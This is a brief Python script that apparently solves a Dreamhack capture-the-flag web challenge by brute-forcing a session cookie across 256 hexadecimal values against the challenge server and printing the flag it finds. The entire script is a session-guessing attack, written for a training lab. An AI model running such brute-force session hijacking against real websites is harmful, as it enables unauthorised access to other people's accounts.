import requests
import re

url = 'http://host3.dreamhack.games:15348'

for i in range(0x100):
    res = requests.get(url, cookies={'sessionid': format(i, 'x')})
    if 'flag' in res.text:
        match = re.search(r'DH\{[^>]*\}', res.text)
        print(match.group(0))
        break